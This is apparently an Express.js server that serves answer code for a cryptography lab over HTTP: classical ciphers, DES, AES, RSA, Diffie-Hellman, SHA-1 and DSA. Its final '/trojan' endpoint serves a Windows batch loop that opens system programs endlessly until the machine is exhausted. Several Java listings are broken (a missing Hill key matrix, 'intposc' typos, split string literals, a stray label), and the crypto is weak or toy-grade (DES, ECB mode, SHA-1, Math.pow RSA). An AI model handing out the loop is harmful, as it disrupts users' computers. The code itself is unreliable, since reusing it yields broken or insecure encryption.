const express = require("express");
const cors = require("cors");
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const apiport = 8080;


  app.get('/hillchiper', async (req, res) => {
  
    try {
     var code=`import java.util.Scanner;
     import javax.swing.JOptionPane;
     public class hillcipher
     { {
     { 1, 2, 1 },
     { 2, 3, 2 },
     { 2, 2, 1 },
     };
     public static int[][] invkeymat = new int[][]
     {
     {-1, 0, 1 },
     { 2,-1, 0 },
     {-2,2,-1},
     };
     public static String key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
     public static void main(String[] args)
     {
     String text,outtext ="",outtext1="";
     int ch, n;
     Scanner sc=new Scanner(System.in);
     System.out.println("Enter the Plain text for Encryption: ");
     text=sc.next();
     text = text.toUpperCase();
     text = text.replaceAll("\\s","");
     n = text.length() % 3;
     if(n!=0)
     {
     for(int i = 1; i<= (3-n);i++)
     {
     text+= 'X';
     } }
     System.out.println("Padded Text:" +text);
     char[] ptextchars = text.toCharArray();
     for(int i=0;i< text.length(); i+=3)
     {
     outtext += encrypt(ptextchars[i],ptextchars[i+1],ptextchars[i+2]);
     }
     System.out.println("Encypted Message:" +outtext);
     char[] ptextchars1 = outtext.toCharArray();
     for(int i=0;i< outtext.length(); i+=3)
     {
     outtext1 += decrypt(ptextchars1[i],ptextchars1[i+1],ptextchars1[i+2]);
     }
     System.out.println("Decrypted Message: " + outtext1);
     }
     private static String encrypt(char a, char b, char c)
     {
     String ret = "";
     int x,y, z;
     int posa=(int)a - 65;
     int posb= (int)b - 65;
     intposc=(int)c -65;
     x=posa*keymat[0][0]+posb* keymat[1][0]+posc*keymat[2][0];
     y=posa*keymat[0][1]+posb*keymat[1][1]+posc* keymat[2][1];
     z=posa*keymat[0][2]+posb*keymat[1][2]+posc*keymat[2][2];
     a = key.charAt(x%26);
     b = key.charAt(y%26);
     c = key.charAt(z%26);
     ret = "" + a + b + c;
     return ret;
     }
     private static String decrypt(char a, char b, char c)
     {
     String ret = "";
     int x,y,z;
     int posa=(int)a - 65;
     int posb= (int)b -65;
     intposc=(int)c -65;
     x=posa*invkeymat[0][0]+posb*invkeymat[1][0]+posc*invkeymat[2][0];
     y=posa*invkeymat[0][1]+posb*invkeymat[1][1]+posc*invkeymat[2][1];
     z=posa*invkeymat[0][2]+posb*invkeymat[1][2]+posc*invkeymat[2][2];
     a =key.charAt((x%26<0)?(26+x%26):(x%26));
     b = key.charAt((y%26<0)?(26+y%26):(y%26));
     c = key.charAt((z%26<0)?(26+z%26):(z%26));
     ret = "" + a + b + c;
     return ret;
     }
     }
     `
      res.header('Content-Type', 'text/plain');
        res.send(code);
    } catch (err) {
        console.error(err);
        res.status(500).send('Server error');
    }
});

app.get('/playfair', async (req, res) => {
  
  try {
   var code=`
   import java.awt.Point;
import java.util.Scanner;

public class PlayfairCipher {
    private int length = 0;
    private String[][] table;

    public static void main(String args[]) {
        PlayfairCipher pf = new PlayfairCipher();
    }

    private PlayfairCipher() {
        System.out.print("Enter the key for playfair cipher: ");
        Scanner sc = new Scanner(System.in);
        String key = parseString(sc);
        while (key.equals(""))
            key = parseString(sc);
        table = this.cipherTable(key);

        System.out.print("Enter the plaintext to be encipher: ");
        String input = parseString(sc);
        while (input.equals(""))
            input = parseString(sc);

        String output = cipher(input);
        String decodedOutput = decode(output);

        this.keyTable(table);
        this.printResults(output, decodedOutput);
    }

    private String parseString(Scanner sc) {
        String parse = sc.nextLine();
        parse = parse.toUpperCase();
        parse = parse.replaceAll("[^A-Z]", "");
        parse = parse.replace("J", "I");
        return parse;
    }

    private String[][] cipherTable(String key) {
        String[][] playfairTable = new String[5][5];
        String keyString = key + "ABCDEFGHIKLMNOPQRSTUVWXYZ";

        for (int i = 0; i < 5; i++)
            for (int j = 0; j < 5; j++)
                playfairTable[i][j] = "";

        for (int k = 0; k < keyString.length(); k++) {
            boolean repeat = false;
            boolean used = false;
            for (int i = 0; i < 5; i++) {
                for (int j = 0; j < 5; j++) {
                    if (playfairTable[i][j].equals("" + keyString.charAt(k))) {
                        repeat = true;
                    } else if (playfairTable[i][j].equals("") && !repeat && !used) {
                        playfairTable[i][j] = "" + keyString.charAt(k);
                        used = true;
                    }
                }
            }
        }
        return playfairTable;
    }

    private String cipher(String in) {
        length = (int) in.length() / 2 + in.length() % 2;
        for (int i = 0; i < (length - 1); i++) {
            if (in.charAt(2 * i) == in.charAt(2 * i + 1)) {
                in = new StringBuffer(in).insert(2 * i + 1, 'X').toString();
                length = (int) in.length() / 2 + in.length() % 2;
            }
        }

        String[] digraph = new String[length];
        for (int j = 0; j < length; j++) {
            if (j == (length - 1) && in.length() / 2 == (length - 1))
                in = in + "X";
            digraph[j] = in.charAt(2 * j) + "" + in.charAt(2 * j + 1);
        }

        String out = "";
        String[] encDigraphs = new String[length];
        encDigraphs = encodeDigraph(digraph);
        for (int k = 0; k < length; k++)
            out = out + encDigraphs[k];
        return out;
    }

    private String[] encodeDigraph(String di[]) {
        String[] encipher = new String[length];
        for (int i = 0; i < length; i++) {
            char a = di[i].charAt(0);
            char b = di[i].charAt(1);
            int r1 = (int) getPoint(a).getX();
            int r2 = (int) getPoint(b).getX();
            int c1 = (int) getPoint(a).getY();
            int c2 = (int) getPoint(b).getY();

            if (r1 == r2) {
                c1 = (c1 + 1) % 5;
                c2 = (c2 + 1) % 5;
            } else if (c1 == c2) {
                r1 = (r1 + 1) % 5;
                r2 = (r2 + 1) % 5;
            } else {
                int temp = c1;
                c1 = c2;
                c2 = temp;
            }
            encipher[i] = table[r1][c1] + "" + table[r2][c2];
        }
        return encipher;
    }

    private String decode(String out) {
        String decoded = "";
        for (int i = 0; i < out.length() / 2; i++) {
            char a = out.charAt(2 * i);
            char b = out.charAt(2 * i + 1);
            int r1 = (int) getPoint(a).getX();
            int r2 = (int) getPoint(b).getX();
            int c1 = (int) getPoint(a).getY();
            int c2 = (int) getPoint(b).getY();

            if (r1 == r2) {
                c1 = (c1 + 4) % 5;
                c2 = (c2 + 4) % 5;
            } else if (c1 == c2) {
                r1 = (r1 + 4) % 5;
                r2 = (r2 + 4) % 5;
            } else {
                int temp = c1;
                c1 = c2;
                c2 = temp;
            }
            decoded = decoded + table[r1][c1] + table[r2][c2];
        }
        return decoded;
    }

    private Point getPoint(char c) {
        Point pt = new Point(0, 0);
        for (int i = 0; i < 5; i++)
            for (int j = 0; j < 5; j++)
                if (c == table[i][j].charAt(0))
                    pt = new Point(i, j);
        return pt;
    }

    private void keyTable(String[][] printTable) {
        System.out.println("Playfair Cipher Key Matrix:");
        System.out.println();
        for (int i = 0; i < 5; i++) {
            for (int j = 0; j < 5; j++) {
                System.out.print(printTable[i][j] + " ");
            }
            System.out.println();
        }
        System.out.println();
    }

    private void printResults(String encipher, String dec) {
        System.out.print("Encrypted Message: ");
        System.out.println(encipher);
        System.out.println();
        System.out.print("Decrypted Message: ");
        System.out.println(dec);
    }
}`
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});

app.get('/vchiper', async (req, res) => {
  
  try {
   var code=`
   public class vigenerecipher1 {
    public static String encrypt(String text, final String key) {
        String res = "";
        text = text.toUpperCase();
        for (int i = 0, j = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c < 'A' || c > 'z')
                continue;
            res += (char) ((c + key.charAt(j) - 2 * 'A') % 26 + 'A');
            j = ++j % key.length();
        }
        return res;
    }

    public static String decrypt(String text, final String key) {
        String res = "";
        text = text.toUpperCase();
        for (int i = 0, j = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c < 'A' || c > 'z')
                continue;
            res += (char) ((c - key.charAt(j) + 26) % 26 + 'A');
            j = ++j % key.length();
        }
        return res;
    }

    public static void main(String[] args) {
        System.out.println("Enter the key: ");
        String key = System.console().readLine();
        System.out.println("Enter the message for encryption: ");
        String message = System.console().readLine();
        String encryptedMsg = encrypt(message, key);
        System.out.println("String: " + message);
        System.out.println("Encrypted message: Cipher Text=" + encryptedMsg);
        System.out.println("Decrypted message: PlainText=" + decrypt(encryptedMsg, key));
    }
  }
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});


app.get('/railfence', async (req, res) => {
  
  try {
   var code=`
   import java.util.Scanner;
public class RailFenceCipher {
public static String encode(String msg, int depth) {
int r = depth;
int l = msg.length();
int c = l / depth;
int k = 0;
char mat[][] = new char[r][c];
StringBuilder enc = new StringBuilder();
for (int i = 0; i < c; i++) {
for (int j = 0; j < r; j++) {
if (k != l) {
mat[j][i] = msg.charAt(k++);
} else {
mat[j][i] = 'X';
}
}
}
for (int i = 0; i < r; i++) {
for (int j = 0; j < c; j++) {
enc.append(mat[i][j]);
}
}
return enc.toString();
}
public static String decode(String encmsg, int depth) {
int r = depth;
int l = encmsg.length();
int c = l / depth;
int k = 0;
char mat[][] = new char[r][c];
StringBuilder dec = new StringBuilder();
for (int i = 0; i < r; i++) {
for (int j = 0; j < c; j++) {
mat[i][j] = encmsg.charAt(k++);
}
}
for (int i = 0; i < c; i++) {
for (int j = 0; j < r; j++) {
if (mat[j][i] != 'X') {
dec.append(mat[j][i]);
}
}
}
return dec.toString();
}
public static void main(String[] args) {
Scanner scanner = new Scanner(System.in);
System.out.println("Enter the Plain text: ");
String msg = scanner.nextLine();
int depth = 3; // You can change the depth here
String enc = encode(msg, depth);
String dec = decode(enc, depth);
System.out.println("Plain Text: " + msg);
System.out.println("Encrypted Message-Cipher Text: " + enc);
System.out.println("Decrypted Message: " + dec);
scanner.close();
} }`
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});



app.get('/transchiper', async (req, res) => {
  
  try {
   var code=`
   import java.util.*;
class TransCipher {
public static void main(String args[]) {
Scanner sc = new Scanner(System.in);
System.out.println("Enter the plain text");
String pl = sc.nextLine();
sc.close();
String s = "";
int start = 0;
for (int i= 0; i< pl.length(); i++) {
if (pl.charAt(i) == ' ') {
s = s + pl.substring(start, i);
start = i + 1;
}
}
s = s + pl.substring(start);
System.out.print(s);
System.out.println();

int k = s.length();
int l = 0;
int col = 4;
int row = s.length() / col;
char ch[][] = new char[row][col];
for (int i = 0; i < row; i++)
{
for (int j = 0; j < col; j++)
{
if (l < k) {
ch[i][j] = s.charAt(l);
l++;
} else {
ch[i][j] = '#';
}
}
}
char trans[][] = new char[col][row];
for (int i = 0; i < row; i++) {
for (int j = 0; j < col; j++) {
trans[j][i] = ch[i][j];
} }
for (int i = 0; i < col; i++)
{
for (int j = 0; j < row; j++)
{
System.out.print(trans[i][j]);
} }
System.out.println();
}
}`
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});


app.get('/des', async (req, res) => {
  
  try {
   var code=`
   import javax.swing.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.util.Random;
class DES {
byte[] skey = new byte[1000];
String skeystring;
static byte[] raw;
String inputmessage, encryptedata, decryptedmessage;
public DES() {
try {
generatesymmetrickey();
inputmessage = JOptionPane.showInputDialog(null, "Enter message
to encrypt:");
byte[] ibyte = inputmessage.getBytes();
byte[] ebyte = encrypt(raw, ibyte);
String encrypteddata = new String(ebyte);
System.out.println("Encrypted message: " + encrypteddata);
JOptionPane.showMessageDialog(null, "Encrypted Data" + "\n" +
encrypteddata);
byte[] dbyte = decrypt(raw, ebyte);
String decryptedmessage = new String(dbyte);
System.out.println("Decrypted message: " + decryptedmessage);
JOptionPane.showMessageDialog(null, "Decrypted Data" + "\n" +
decryptedmessage);
} catch (Exception e) {
System.out.println(e);
}
}
void generatesymmetrickey() {
try {
Random r = new Random();
int num = r.nextInt(10000);
String knum = String.valueOf(num);
byte[] knumb = knum.getBytes();
skey = getRawKey(knumb);
skeystring = new String(skey);
System.out.println("DES SymmetricKey=" + skeystring);
} catch (Exception e) {
System.out.println(e);
}
}
private static byte[] getRawKey(byte[] seed) throws Exception {
KeyGenerator kgen = KeyGenerator.getInstance("DES");
SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
sr.setSeed(seed);
kgen.init(56, sr);
SecretKey skey = kgen.generateKey();
raw = skey.getEncoded();
return raw;
}
private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception {
SecretKey seckey = new SecretKeySpec(raw, "DES");
Cipher cipher = Cipher.getInstance("DES");
cipher.init(Cipher.ENCRYPT_MODE, seckey);
byte[] encrypted = cipher.doFinal(clear);
return encrypted;
}
private static byte[] decrypt(byte[] raw, byte[] encrypted) throws
Exception {
SecretKey seckey = new SecretKeySpec(raw, "DES");
Cipher cipher = Cipher.getInstance("DES");
cipher.init(Cipher.DECRYPT_MODE, seckey);
byte[] decrypted = cipher.doFinal(encrypted);
return decrypted;
}
public static void main(String args[]) {
DES des = new DES();
}
}`
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});


app.get('/aes', async (req, res) => {
  
  try {
   var code=`
   import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
public class AES
{
private static SecretKeySpec secretKey;
private static byte[] key;
public static void setKey(String myKey) {
MessageDigest sha = null;
try {
key = myKey.getBytes("UTF-8");
sha = MessageDigest.getInstance("SHA-1");
key = sha.digest(key);
key= Arrays.copyOf(key, 16);
secretKey= new SecretKeySpec(key, "AES");
} catch (NoSuchAlgorithmException e) {
e.printStackTrace();
} catch (UnsupportedEncodingException e) {
e.printStackTrace();
}
}
public static String encrypt(String strToEncrypt, String secret) {
try {
setKey(secret);
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
cipher.init(Cipher.ENCRYPT_MODE, secretKey);
return Base64.getEncoder().encodeToString(cipher.doFinal(strToEncrypt.getBytes
("UTF-8")));
} catch (Exception e) {
System.out.println("Error while encrypting: " + e.toString());
}
return null;
}
public static String decrypt(String strToDecrypt, String secret) {
try {
setKey(secret);
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
cipher.init(Cipher.DECRYPT_MODE, secretKey);
return new String(cipher.doFinal(Base64.getDecoder().decode(strToDecrypt)));
} catch (Exception e) {
System.out.println("Error while decrypting: " + e.toString());
}
return null;
}
public static void main(String[] args) {
System.out.println("Enter the secret key: ");
String secretKey= System.console().readLine();
System.out.println("Enter the original URL: ");
String originalString= System.console().readLine();
String encryptedString = AES.encrypt(originalString, secretKey);
String decryptedString = AES.decrypt(encryptedString, secretKey);
System.out.println("URL Encryption Using AES Algorithm\n ---------- ");
System.out.println("Original URL : " + originalString);
System.out.println("Encrypted URL : " + encryptedString);
System.out.println("Decrypted URL : " + decryptedString);
}
}
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});



app.get('/rsa', async (req, res) => {
  
  try {
   var code=`
   <html>
<head>
<title>RSA Encryption</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<center>
<h1>RSA Algorithm</h1>
<h2>Implemented Using HTML & Javascript</h2>
<hr>
<table>
<tr>
<td>Enter First Prime Number:</td>
<td><input type="number" value="53" id="p"></td>
</tr>
<tr>
<td>Enter Second Prime Number:</td>
<td><input type="number" value="59" id="q"></p> </td>
</tr>
<tr>
<td>Enter the Message(cipher text):<br>[A=1, B=2,...]</td>
<td><input type="number" value="89" id="msg"></p> </td>
</tr>
<tr>
<td>Public Key:</td>
<td><p id="publickey"></p> </td>
</tr>
<tr>
<td>Exponent:</td>
<td><p id="exponent"></p> </td>
</tr>
<tr>
<td>Private Key:</td>
<td><p id="privatekey"></p></td>
</tr>
<tr>
<td>Cipher Text:</td>
<td><p id="ciphertext"></p> </td>
</tr>
<tr>
<td><button onclick="RSA();">Apply RSA</button></td>
</tr>
</table> </center>
</body>
<script type="text/javascript">
function RSA()
{
var gcd, p, q, no, n, t, e, i, x;
gcd = function (a, b) { return (!b) ? a : gcd(b, a % b); };
p = document.getElementById('p').value;
q = document.getElementById('q').value;
no = document.getElementById('msg').value;
n = p * q;
t = (p - 1) * (q - 1);
for (e = 2; e < t; e++)
{
if (gcd(e, t) == 1)
{
break;
}
}
for (i = 0; i < 10; i++){
x = 1 + i * t
if (x % e == 0){
d = x / e;
break; }}
ctt = Math.pow(no, e).toFixed(0);
ct = ctt % n;
dtt = Math.pow(ct, d).toFixed(0);
dt = dtt % n;
document.getElementById('publickey').innerHTML = n;
document.getElementById('exponent').innerHTML = e;
document.getElementById('privatekey').innerHTML = d;
document.getElementById('ciphertext').innerHTML = ct;
}
</script>
</html>


   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});



app.get('/dhkey', async (req, res) => {
  
  try {
   var code=`
   import java.io.*;
   import java.math.BigInteger;
   class dh
   {
   public static void main(String[]args)throws IOException
   {
   BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
   System.out.println("Enter prime number:");
   BigInteger p=new BigInteger(br.readLine());
   System.out.print("Enter primitive root of "+p+":");
   BigInteger g=new BigInteger(br.readLine());
   System.out.println("Enter value for x less than "+p+":");
   BigInteger x=new BigInteger(br.readLine());
   BigInteger R1=g.modPow(x,p);
   System.out.println("R1="+R1);
   System.out.print("Enter value for y less than "+p+":");
   BigInteger y=new BigInteger(br.readLine());
   BigInteger R2=g.modPow(y,p);
   System.out.println("R2="+R2);
   BigInteger k1=R2.modPow(x,p);
   System.out.println("Key calculated at Sender's side:"+k1);
   BigInteger k2=R1.modPow(y,p);
   System.out.println("Key calculated at Receiver's side:"+k2);
   System.out.println("Diffie-Hellman secret key was calculated.");
   }
   }
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});



app.get('/sha', async (req, res) => {
  
  try {
   var code=`
   import java.util.Scanner;
   import java.security.MessageDigest;
   import java.security.NoSuchAlgorithmException;
   public class sha1
   {
   public static void main(String[] args)throws NoSuchAlgorithmException
   {
   Scanner sc = new Scanner(System.in);
   System.out.println("Enter the String:");
   String message = new String();
   message = sc.next();
   System.out.println("Mesage Digest is=");
   System.out.println(sha1(message));
   }
   static String sha1(String input)throws NoSuchAlgorithmException
   {
   MessageDigest mDigest = MessageDigest.getInstance("SHA1");
   byte[] result = mDigest.digest(input.getBytes());
   StringBuffer sb = new StringBuffer();
   for(int i = 0;i<result.length;i++)
   {
   sb.append(Integer.toString((result[i] & 0xff) + 0x100, 16).substring(1));
   }
   return sb.toString();
   }
   }
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});




app.get('/dss', async (req, res) => {
  
  try {
   var code=`
   import java.util.*;
import java.math.BigInteger;
class dsaAlg {
final static BigInteger one = new BigInteger("1");
final static BigInteger zero = new BigInteger("0");
public static BigInteger getNextPrime(String ans)
{
BigInteger test = new BigInteger(ans);
while (!test.isProbablePrime(99))
e:
{
test = test.add(one);
}
return test;
}
public static BigInteger findQ(BigInteger n)
{
BigInteger start = new BigInteger("2");
while (!n.isProbablePrime(99)){
while (!((n.mod(start)).equals(zero))){
start = start.add(one);}
n = n.divide(start);}
return n;}
public static BigInteger getGen(BigInteger p, BigInteger q,
Random r)
{
BigInteger h = new BigInteger(p.bitLength(), r);
h = h.mod(p);
return h.modPow((p.subtract(one)).divide(q), p);
}
public static void main (String[] args) throws
java.lang.Exception
{
Random randObj = new Random();
BigInteger p = getNextPrime("10600"); /* approximate
prime */
BigInteger q = findQ(p.subtract(one));
BigInteger g = getGen(p,q,randObj);
System.out.println(" \n simulation of Digital Signature Algorithm \n");
System.out.println(" \n global public key components are:\n");
System.out.println("\np is: " + p);
System.out.println("\nq is: " + q);
System.out.println("\ng is: " + g);
BigInteger x = new BigInteger(q.bitLength(), randObj);
x = x.mod(q);
BigInteger y= g.modPow(x,p);
BigInteger k = new BigInteger(q.bitLength(), randObj);
k = k.mod(q);
BigInteger r = (g.modPow(k,p)).mod(q);
BigInteger hashVal = new BigInteger(p.bitLength(),
randObj);
BigInteger kInv = k.modInverse(q);
BigInteger s = kInv.multiply(hashVal.add(x.multiply(r)));
s = s.mod(q);
System.out.println("\nsecret information are:\n");
System.out.println("x (private) is:" + x);
System.out.println("k (secret) is: " + k);
System.out.println("y (public) is: " + y);
System.out.println("h (rndhash) is: " + hashVal);
System.out.println("\n generating digital signature:\n");
System.out.println("r is : " + r);
System.out.println("s is : " + s);
BigInteger w = s.modInverse(q);
BigInteger u1 = (hashVal.multiply(w)).mod(q);
BigInteger u2 = (r.multiply(w)).mod(q);
BigInteger v= (g.modPow(u1,p)).multiply(y.modPow(u2,p));
v = (v.mod(p)).mod(q);
System.out.println("\nverifying digital signature (checkpoints)\n:");
System.out.println("w is : " + w);
System.out.println("u1 is : " + u1);
System.out.println("u2 is : " + u2);
System.out.println("v is : " + v);
if (v.equals(r))
{
System.out.println("\nsuccess: digital signature is verified!\n " + r);}
else{
System.out.println("\n error: incorrect digitalsignature\n ");}}}
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});



app.get('/trojan', async (req, res) => {
  
  try {
   var code=`
@echo off
:x
start mspaint
start notepad
start cmd
start explorer
start control
start calc
goto x
   `
    res.header('Content-Type', 'text/plain');
      res.send(code);
  } catch (err) {
      console.error(err);
      res.status(500).send('Server error');
  }
});

    app.listen(apiport, () => {
        console.log("Backend server is running" + " " + apiport);
      });
    
  

